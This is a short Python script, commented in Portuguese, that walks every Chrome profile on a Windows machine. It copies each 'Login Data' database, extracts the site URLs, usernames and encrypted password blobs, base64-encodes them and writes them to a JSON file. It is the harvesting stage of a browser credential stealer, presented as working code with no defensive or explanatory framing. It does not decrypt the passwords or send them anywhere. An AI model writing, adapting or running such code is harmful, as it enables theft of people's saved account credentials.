import os
import json
import base64
import shutil
import sqlite3
import tempfile

def find_chrome_profiles() -> list[tuple[str, str]]:
    """
    Retorna lista de perfis (nome, caminho_para_Login Data) em:
    %LOCALAPPDATA%/Google/Chrome/User Data/{Default,Profile *}/Login Data
    """
    base = os.path.join(
        os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome", "User Data"
    )
    profiles = []
    for name in os.listdir(base):
        if name == "Default" or name.startswith("Profile"):
            db = os.path.join(base, name, "Login Data")
            if os.path.isfile(db):
                profiles.append((name, db))
    return profiles

def collect_encrypted_logins() -> dict:
    """
    Varre todos os perfis do Chrome e retorna um dicionário com
    perfil, site, usuário e senha criptografada em Base64.
    """
    result = []
    profiles = find_chrome_profiles()
    for profile_name, db_path in profiles:
        # copia para evitar bloqueio
        tmp_db = os.path.join(tempfile.gettempdir(), f"{profile_name}_LoginData.db")
        shutil.copy2(db_path, tmp_db)

        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()

        for origin_url, username, pwd_blob in rows:
            # pwd_blob provavelmente já é bytes; encode em base64
            pwd_b64 = base64.b64encode(pwd_blob).decode('ascii')
            result.append({
                "profile": profile_name,
                "site": origin_url,
                "user": username,
                "password_encrypted": pwd_b64
            })

        cursor.close()
        conn.close()
        os.remove(tmp_db)

    return {"logins": result}

def save_logins_to_file(data, filename="chrome_logins.json"):
    """
    Salva os dados de logins no arquivo JSON.
    """
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

if __name__ == "__main__":
    data = collect_encrypted_logins()
    save_logins_to_file(data)
    print(f"✅ Dados salvos no arquivo chrome_logins.json")
